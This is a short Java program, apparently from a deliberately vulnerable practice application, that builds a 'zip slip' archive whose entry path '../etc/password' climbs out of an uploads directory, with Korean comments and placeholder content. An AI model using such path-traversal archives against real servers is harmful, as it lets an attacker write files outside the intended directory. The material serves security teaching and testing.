package com.vulnapp.vulnerabilities.api.service;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ApiAttackZipGenerator {

    public static void main(String[] args) {
        try {
            // 운영체제 확인
            String os = System.getProperty("os.name").toLowerCase();
            System.out.println("현재 운영체제: " + os);

            // ZIP 파일 생성
            File zipFile = new File("api_attack.zip");
            try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFile.toPath()))) {
                // 운영체제에 따른 경로 설정
                String entryPath;
                if (os.contains("win")) {
                    // Windows 환경 - uploads 디렉토리에서 한 단계 위로
                    entryPath = "..\\etc\\password";
                    System.out.println("Windows용 ZIP 경로 생성: " + entryPath);
                } else {
                    // Mac/Linux 환경 - uploads 디렉토리에서 한 단계 위로
                    entryPath = "../etc/password";
                    System.out.println("Mac/Linux용 ZIP 경로 생성: " + entryPath);
                }

                ZipEntry entry = new ZipEntry(entryPath);
                zos.putNextEntry(entry);

                String content = "This is a simulated attack content from " + os;
                zos.write(content.getBytes());
                zos.closeEntry();
            }
            System.out.println("ZIP 파일 생성 완료: " + zipFile.getAbsolutePath());

        } catch (IOException e) {
            System.err.println("ZIP 파일 생성 중 오류 발생: " + e.getMessage());
        }
    }
}